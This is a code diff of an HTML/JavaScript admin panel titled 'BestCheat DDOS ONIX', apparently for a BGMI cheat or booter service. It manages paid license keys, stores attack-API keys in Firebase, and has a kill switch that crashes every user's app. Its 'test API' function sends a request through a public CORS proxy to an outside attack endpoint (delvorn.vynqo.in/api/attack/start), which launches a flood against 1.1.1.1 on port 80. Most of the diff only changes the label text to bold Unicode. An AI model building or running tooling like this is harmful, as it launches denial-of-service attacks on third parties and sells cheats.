@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BGMI Admin Panel</title>
+    <title>𝐁𝐞𝐒𝐭𝐂𝐡𝐄𝐚𝐓 ✘ 𝐃𝐃𝐎𝐒 𝐎𝐍𝐈𝐗 ♪</title>
     <style>
         body { background-color: #0a0a0f; color: #fff; font-family: monospace; padding: 20px; }
         h2 { color: #00ff41; margin-bottom: 10px; font-size: 18px; text-transform: uppercase; letter-spacing: 1px;}
@@ -36,82 +36,82 @@
 <body>
 
     <div id="loginBox" class="box">
-        <h2>🔐 ADMIN LOGIN</h2>
-        <input type="password" id="adminPass" placeholder="Enter Password">
-        <button onclick="login()">LOGIN</button>
+        <h2>🔐 𝐀𝐃𝐌𝐈𝐍 𝐋𝐎𝐆𝐈𝐍</h2>
+        <input type="password" id="adminPass" placeholder="𝐄𝐧𝐭𝐞𝐫 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝">
+        <button onclick="login()">𝐋𝐎𝐆𝐈𝐍</button>
     </div>
 
     <div id="mainPanel" class="hidden">
         <div class="box">
-            <h2>🌐 DATABASE URL</h2>
+            <h2>🌐 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐔𝐑𝐋</h2>
             <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
             <div class="btn-group">
-                <button onclick="saveDb()" class="success">SAVE</button>
-                <button onclick="updateDb()" class="warning">UPDATE</button>
-                <button onclick="deleteDb()" class="danger">DELETE</button>
+                <button onclick="saveDb()" class="success">𝐒𝐀𝐕𝐄</button>
+                <button onclick="updateDb()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄</button>
+                <button onclick="deleteDb()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄</button>
             </div>
         </div>
 
         <div class="box">
-            <h2>🔑 API KEYS (10 SLOTS)</h2>
+            <h2>🔑 𝐀𝐏𝐈 𝐊𝐄𝐘𝐒 (𝟏𝟎 𝐒𝐋𝐎𝐓𝐒)</h2>
             <div id="apiSlots">
-                <input type="text" id="apiKey1" placeholder="API Key 1">
-                <input type="text" id="apiKey2" placeholder="API Key 2">
-                <input type="text" id="apiKey3" placeholder="API Key 3">
-                <input type="text" id="apiKey4" placeholder="API Key 4">
-                <input type="text" id="apiKey5" placeholder="API Key 5">
-                <input type="text" id="apiKey6" placeholder="API Key 6">
-                <input type="text" id="apiKey7" placeholder="API Key 7">
-                <input type="text" id="apiKey8" placeholder="API Key 8">
-                <input type="text" id="apiKey9" placeholder="API Key 9">
-                <input type="text" id="apiKey10" placeholder="API Key 10">
+                <input type="text" id="apiKey1" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏">
+                <input type="text" id="apiKey2" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟐">
+                <input type="text" id="apiKey3" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟑">
+                <input type="text" id="apiKey4" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟒">
+                <input type="text" id="apiKey5" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟓">
+                <input type="text" id="apiKey6" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟔">
+                <input type="text" id="apiKey7" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟕">
+                <input type="text" id="apiKey8" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟖">
+                <input type="text" id="apiKey9" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟗">
+                <input type="text" id="apiKey10" placeholder="𝐀𝐏𝐈 𝐊𝐞𝐲 𝟏𝟎">
             </div>
             <div class="btn-group">
-                <button onclick="saveApi()" class="success">SAVE APIs</button>
-                <button onclick="updateApi()" class="warning">UPDATE APIs</button>
-                <button onclick="deleteApi()" class="danger">DELETE APIs</button>
+                <button onclick="saveApi()" class="success">𝐒𝐀𝐕𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="updateApi()" class="warning">𝐔𝐏𝐃𝐀𝐓𝐄 𝐀𝐏𝐈𝐬</button>
+                <button onclick="deleteApi()" class="danger">𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈𝐬</button>
             </div>
         </div>
 
         <div class="box">
-            <h2>⚡ TEST API ONLINE</h2>
+            <h2>⚡ 𝐓𝐄𝐒𝐓 𝐀𝐏𝐈 𝐎𝐍𝐋𝐈𝐍𝐄</h2>
             <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;"></div>
             <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px;"></div>
         </div>
 
         <div class="box">
-            <h2>📢 CUSTOM NOTIFICATION & CRASH MESSAGE</h2>
-            <input type="text" id="notifTitle" placeholder="Notification Title" value="App Locked By Owner">
-            <textarea id="notifMessage" placeholder="Notification Message" style="min-height: 80px;">Lock Apply Within 10s. Agar tum 10s baad open kroge toh open nahi hoga!</textarea>
-            <button onclick="saveNotif()" class="success">SAVE & UPDATE MESSAGE</button>
+            <h2>📢 𝐂𝐔𝐒𝐓𝐎𝐌 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</h2>
+            <input type="text" id="notifTitle" placeholder="𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐓𝐢𝐭𝐥𝐞" value="𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫">
+            <textarea id="notifMessage" placeholder="𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞" style="min-height: 80px;">𝐋𝐨𝐜𝐤 𝐀𝐩𝐩𝐥𝐲 𝐖𝐢𝐭𝐡𝐢𝐧 𝟏𝟎𝐬 ➪ 𝐀𝐠𝐚𝐫 𝐭𝐮𝐦 𝟏𝟎𝐬 𝐛𝐚𝐚𝐝 𝐨𝐩𝐞𝐧 𝐤𝐫𝐨𝐠𝐞 𝐭𝐨𝐡 𝐨𝐩𝐞𝐧 𝐧𝐚𝐡𝐢 𝐡𝐨𝐠𝐚!</textarea>
+            <button onclick="saveNotif()" class="success">𝐒𝐀𝐕𝐄 & 𝐔𝐏𝐃𝐀𝐓𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄</button>
         </div>
 
         <div class="box">
-            <h2>🛑 APP LOCK STATUS</h2>
+            <h2>🛑 𝐀𝐏𝐏 𝐋𝐎𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒</h2>
             <div class="lock-box">
-                <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">Status: UNLOCKED</div>
+                <div id="lockStatusText" style="font-size: 16px; font-weight: bold; color: #00ff41;">𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃</div>
                 <label class="switch">
                     <input type="checkbox" id="lockSwitch" onchange="toggleKill()">
                     <span class="slider"></span>
                 </label>
             </div>
-            <div style="font-size: 11px; color: #888; margin-top: 10px;">Turn ON to crash all users instantly.</div>
+            <div style="font-size: 11px; color: #888; margin-top: 10px;">𝐓𝐮𝐫𝐧 𝐎𝐍 𝐭𝐨 𝐜𝐫𝐚𝐬𝐡 𝐚𝐥𝐥 𝐮𝐬𝐞𝐫𝐬 𝐢𝐧𝐬𝐭𝐚𝐧𝐭𝐥𝐲.</div>
         </div>
 
         <div class="box">
-            <h2>🔑 GENERATE NEW KEY</h2>
-            <input type="text" id="keyName" placeholder="Key Name (e.g. VIP-USER)">
-            <input type="text" id="keyExpiry" placeholder="Expiry (1m, 1h, 1d, 7d)">
-            <button onclick="generateKey()" class="success">GENERATE KEY</button>
+            <h2>🔑 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐍𝐄𝐖 𝐊𝐄𝐘</h2>
+            <input type="text" id="keyName" placeholder="𝐊𝐞𝐲 𝐍𝐚𝐦𝐞 (𝐞.𝐠. 𝐕𝐈𝐏-𝐔𝐒𝐄𝐑)">
+            <input type="text" id="keyExpiry" placeholder="𝐄𝐱𝐩𝐢𝐫𝐲 (𝟏𝐦, 𝟏𝐡, 𝟏𝐝, 𝟕𝐝)">
+            <button onclick="generateKey()" class="success">𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐊𝐄𝐘</button>
             <div id="newKeyDisplay" class="hidden" style="margin-top:15px; border:1px dashed #00ff41; padding:15px; background: #000;">
                 <div id="newKeyText" style="white-space: pre-wrap; line-height: 1.5; color: #00e5ff;"></div>
-                <button class="copy-btn" onclick="copyGeneratedKey()">📋 COPY KEY DETAILS</button>
+                <button class="copy-btn" onclick="copyGeneratedKey()">📋 𝐂𝐎𝐏𝐘 𝐊𝐄𝐘 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</button>
             </div>
         </div>
 
         <div class="box">
-            <h2>📋 ALL KEYS & DETAILS</h2>
-            <button onclick="fetchKeys()" class="info">REFRESH LIST</button>
+            <h2>📋 𝐀𝐋𝐋 𝐊𝐄𝐘𝐒 & 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</h2>
+            <button onclick="fetchKeys()" class="info">𝐑𝐄𝐅𝐑𝐄𝐒𝐇 𝐋𝐈𝐒𝐓</button>
             <div id="keyList" style="margin-top:15px;"></div>
         </div>
     </div>
@@ -130,46 +130,35 @@
                 fetchKeys();
                 fetchApis();
                 fetchNotification();
-            } else { alert("Wrong Password"); }
+            } else { alert("𝐖𝐫𝐨𝐧𝐠 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝"); }
         }
 
-        // --- FIX: Database URL Save with Firebase REST API ---
         async function saveDb() {
             const db = dbUrlInput.value.trim();
-            if (!db) return alert("Enter DB URL");
+            if (!db) return alert("𝐄𝐧𝐭𝐞𝐫 𝐃𝐁 𝐔𝐑𝐋");
             if (!db.endsWith('/')) { dbUrlInput.value = db + '/'; }
             localStorage.setItem('dbUrl', dbUrlInput.value);
-            
-            // Save URL to Firebase Cloud so App can fetch
-            await fetch(`${dbUrlInput.value}settings/config.json`, { 
-                method: 'PUT', 
-                body: JSON.stringify({ db_url: dbUrlInput.value }) 
-            });
-            alert("DB URL Saved & Pushed to Cloud!");
+            await fetch(`${dbUrlInput.value}settings/config.json`, { method: 'PUT', body: JSON.stringify({ db_url: dbUrlInput.value }) });
+            alert("𝐃𝐁 𝐔𝐑𝐋 𝐒𝐚𝐯𝐞𝐝 & 𝐏𝐮𝐬𝐡𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
         }
 
-        function updateDb() { saveDb(); alert("DB URL Updated in Cloud!"); }
+        function updateDb() { saveDb(); alert("𝐃𝐁 𝐔𝐑𝐋 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐢𝐧 𝐂𝐥𝐨𝐮𝐝!"); }
         function deleteDb() {
-            if(confirm("Delete Database URL?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("DB URL Deleted Locally!"); }
+            if(confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐔𝐑𝐋?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("𝐃𝐁 𝐔𝐑𝐋 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐋𝐨𝐜𝐚𝐥𝐥𝐲!"); }
         }
 
         async function saveApi() {
             const db = dbUrlInput.value;
-            if (!db) return alert("Save DB URL first");
-            let updateData = { db_url: db }; // Add db_url here as well to keep it safe
+            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
+            let updateData = { db_url: db };
             for(let i=1; i<=10; i++) { updateData[`api_key_${i}`] = document.getElementById(`apiKey${i}`).value.trim(); }
-            
-            // Save APIs to Cloud
-            await fetch(`${db}settings/config.json`, { 
-                method: 'PATCH', 
-                body: JSON.stringify(updateData) 
-            });
-            alert("APIs Saved to Cloud!");
+            await fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify(updateData) });
+            alert("𝐀𝐏𝐈𝐬 𝐒𝐚𝐯𝐞𝐝 𝐭𝐨 𝐂𝐥𝐨𝐮𝐝!");
             fetchApis();
         }
         function updateApi() { saveApi(); }
         function deleteApi() {
-            if(confirm("Clear all API Keys?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
+            if(confirm("𝐂𝐥𝐞𝐚𝐫 𝐚𝐥𝐥 𝐀𝐏𝐈 𝐊𝐞𝐲𝐬?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
         }
 
         async function fetchApis() {
@@ -186,7 +175,7 @@
                         document.getElementById(`apiKey${i}`).value = keyVal;
                         if(keyVal.trim() !== "") {
                             const btn = document.createElement('button');
-                            btn.innerText = `Test API Slot ${i}`;
+                            btn.innerText = `𝐓𝐞𝐬𝐭 𝐀𝐏𝐈 𝐒𝐥𝐨𝐭 ${i}`;
                             btn.className = "info"; btn.style.width = "auto";
                             btn.onclick = () => testApi(keyVal, i);
                             testBtnContainer.appendChild(btn);
@@ -198,32 +187,29 @@
 
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
-            resDiv.innerHTML = `<span style="color:#00e5ff;">Testing Slot ${slotNumber}... Please wait.</span>`;
-
+            resDiv.innerHTML = `<span style="color:#00e5ff;">𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐒𝐥𝐨𝐭 ${slotNumber}... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</span>`;
             const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
-            
             try {
                 const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
                 const response = await fetch(proxyUrl);
                 const text = await response.text();
-                
                 if (text.includes('"status": "success"') || text.includes('"status":"success"') || text.includes('Attack dispatched')) {
-                    resDiv.innerHTML = `<span class="green">✅ API TEST PASS (Slot ${slotNumber} is Online)</span><br><small>${text}</small>`;
+                    resDiv.innerHTML = `<span class="green">☑️ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐏𝐀𝐒𝐒 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞)</span><br><small>${text}</small>`;
                 } else {
-                    resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Slot ${slotNumber} Error)</span><br><small>${text}</small>`;
+                    resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐒𝐥𝐨𝐭 ${slotNumber} 𝐄𝐫𝐫𝐨𝐫)</span><br><small>${text}</small>`;
                 }
             } catch (error) {
-                resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Network Error / Invalid API)</span>`;
+                resDiv.innerHTML = `<span class="red">❌ 𝐀𝐏𝐈 𝐓𝐄𝐒𝐓 𝐅𝐀𝐈𝐋 (𝐍𝐞𝐭𝐰𝐨𝐫𝐤 𝐄𝐫𝐫𝐨𝐫 / 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐀𝐏𝐈)</span>`;
             }
         }
 
         async function saveNotif() {
             const db = dbUrlInput.value;
-            if (!db) return alert("Save DB URL first");
+            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
             const title = document.getElementById('notifTitle').value;
             const message = document.getElementById('notifMessage').value;
             await fetch(`${db}settings/notification.json`, { method: 'PUT', body: JSON.stringify({ title: title, message: message }) });
-            alert("Notification Message Saved!");
+            alert("𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐚𝐯𝐞𝐝!");
         }
 
         async function fetchNotification() {
@@ -233,15 +219,15 @@
                 const res = await fetch(`${db}settings/notification.json`);
                 const data = await res.json();
                 if (data) {
-                    document.getElementById('notifTitle').value = data.title || "App Locked By Owner";
-                    document.getElementById('notifMessage').value = data.message || "Lock Apply Within 10s...";
+                    document.getElementById('notifTitle').value = data.title || "𝐀𝐩𝐩 𝐋𝐨𝐜𝐤𝐞𝐝 𝐁𝐲 𝐎𝐰𝐧𝐞𝐫";
+                    document.getElementById('notifMessage').value = data.message || "𝐋𝐨𝐜𝐤 𝐀𝐩𝐩𝐥𝐲 𝐖𝐢𝐭𝐡𝐢𝐧 𝟏𝟎𝐬...";
                 }
             } catch(e) {}
         }
 
         async function toggleKill() {
             const db = dbUrlInput.value;
-            if (!db) return alert("Save DB URL first");
+            if (!db) return alert("𝐒𝐚𝐯𝐞 𝐃𝐁 𝐔𝐑𝐋 𝐟𝐢𝐫𝐬𝐭");
             const isChecked = document.getElementById('lockSwitch').checked;
             await fetch(`${db}settings/app_blocked.json`, { method: 'PUT', body: JSON.stringify(isChecked) });
             fetchKillStatus();
@@ -256,15 +242,15 @@
                 const statusText = document.getElementById('lockStatusText');
                 const switchBtn = document.getElementById('lockSwitch');
                 if (status === true) {
-                    statusText.innerText = "Status: LOCKED (App Crashed)"; statusText.style.color = "#ff003c"; switchBtn.checked = true;
+                    statusText.innerText = "𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐋𝐎𝐂𝐊𝐄𝐃 (𝐀𝐩𝐩 𝐂𝐫𝐚𝐬𝐡𝐞𝐝)"; statusText.style.color = "#ff003c"; switchBtn.checked = true;
                 } else {
-                    statusText.innerText = "Status: UNLOCKED"; statusText.style.color = "#00ff41"; switchBtn.checked = false;
+                    statusText.innerText = "𝐒𝐭𝐚𝐭𝐮𝐬 ➪ 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃"; statusText.style.color = "#00ff41"; switchBtn.checked = false;
                 }
             } catch (e) {}
         }
 
         function formatTime(timestamp) {
-            if (!timestamp || timestamp === 0) return "N/A";
+            if (!timestamp || timestamp === 0) return "𝐍/𝐀";
             const d = new Date(timestamp);
             return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
         }
@@ -273,7 +259,7 @@
             const db = dbUrlInput.value;
             const name = document.getElementById('keyName').value;
             const expiry = document.getElementById('keyExpiry').value;
-            if (!db || !name || !expiry) return alert("Fill all fields");
+            if (!db || !name || !expiry) return alert("𝐅𝐢𝐥𝐥 𝐚𝐥𝐥 𝐟𝐢𝐞𝐥𝐝𝐬");
 
             let timeMs = 0;
             if (expiry.endsWith('m')) timeMs = parseInt(expiry) * 60000;
@@ -292,7 +278,7 @@
         }
 
         function copyGeneratedKey() {
-            navigator.clipboard.writeText(generatedKeyText).then(() => { alert("Key Details Copied!"); });
+            navigator.clipboard.writeText(generatedKeyText).then(() => { alert("𝐊𝐞𝐲 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 𝐂𝐨𝐩𝐢𝐞𝐝!"); });
         }
 
         async function fetchKeys() {
@@ -305,34 +291,34 @@
                 if (data) {
                     for (let key in data) {
                         const k = data[key];
-                        const status = k.blocked ? "BLOCKED" : "ACTIVE";
+                        const status = k.blocked ? "𝐁𝐋𝐎𝐂𝐊𝐄𝐃" : "𝐀𝐂𝐓𝐈𝐕𝐄";
                         const color = k.blocked ? "red" : "green";
-                        const usedStatus = (k.firstUsed === 0 || k.firstUsed === undefined) ? "NOT USED YET" : "USED";
-                        const device = k.device || "None";
+                        const usedStatus = (k.firstUsed === 0 || k.firstUsed === undefined) ? "𝐍𝐎𝐓 𝐔𝐒𝐄𝐃 𝐘𝐄𝐓" : "𝐔𝐒𝐄𝐃";
+                        const device = k.device || "𝐍𝐨𝐧𝐞";
                         
-                        let timeLeft = "Not Started";
+                        let timeLeft = "𝐍𝐨𝐭 𝐒𝐭𝐚𝐫𝐭𝐞𝐝";
                         if (k.firstUsed !== 0 && k.firstUsed !== undefined) {
                             const remaining = k.expiry - Date.now();
-                            if (remaining > 0) timeLeft = Math.floor(remaining/1000) + "s left";
-                            else timeLeft = "EXPIRED";
+                            if (remaining > 0) timeLeft = Math.floor(remaining/1000) + "𝐬 𝐥𝐞𝐟𝐭";
+                            else timeLeft = "𝐄𝐗𝐏𝐈𝐑𝐄𝐃";
                         }
 
                         html += `
                             <div class="key-item">
                                 <b class="cyan">${key}</b> <br>
-                                <span class="${color}">STATUS: ${status}</span> | <span class="green">${usedStatus}</span><br>
-                                <b>Device:</b> ${device}<br>
-                                <b>Expiry:</b> ${formatTime(k.expiry)}<br>
-                                <b>Time Left:</b> ${timeLeft}<br>
+                                <span class="${color}">𝐒𝐓𝐀𝐓𝐔𝐒 ➪ ${status}</span> | <span class="green">${usedStatus}</span><br>
+                                <b>𝐃𝐞𝐯𝐢𝐜𝐞 ➪</b> ${device}<br>
+                                <b>𝐄𝐱𝐩𝐢𝐫𝐲 ➪</b> ${formatTime(k.expiry)}<br>
+                                <b>𝐓𝐢𝐦𝐞 𝐋𝐞𝐟𝐭 ➪</b> ${timeLeft}<br>
                                 <div class="btn-group">
-                                    <button class="danger" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="deleteKey('${key}')">DELETE</button>
-                                    <button class="success" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="toggleBlockKey('${key}', ${!k.blocked})">${k.blocked ? 'UNBLOCK' : 'BLOCK'}</button>
+                                    <button class="danger" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="deleteKey('${key}')">𝐃𝐄𝐋𝐄𝐓𝐄</button>
+                                    <button class="success" style="padding:5px 10px; font-size:12px; margin-top:8px;" onclick="toggleBlockKey('${key}', ${!k.blocked})">${k.blocked ? '𝐔𝐍𝐁𝐋𝐎𝐂𝐊' : '𝐁𝐋𝐎𝐂𝐊'}</button>
                                 </div>
                             </div>
                         `;
                     }
                 }
-                document.getElementById('keyList').innerHTML = html || "No keys found.";
+                document.getElementById('keyList').innerHTML = html || "𝐍𝐨 𝐤𝐞𝐲𝐬 𝐟𝐨𝐮𝐧𝐝.";
             } catch (e) {}
         }
 
@@ -344,7 +330,7 @@
 
         async function deleteKey(key) {
             const db = dbUrlInput.value;
-            if (confirm("Delete this key permanently?")) {
+            if (confirm("𝐃𝐞𝐥𝐞𝐭𝐞 𝐭𝐡𝐢𝐬 𝐤𝐞𝐲 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲?")) {
                 await fetch(`${db}keys/${key}.json`, { method: 'DELETE' });
                 fetchKeys();
             }
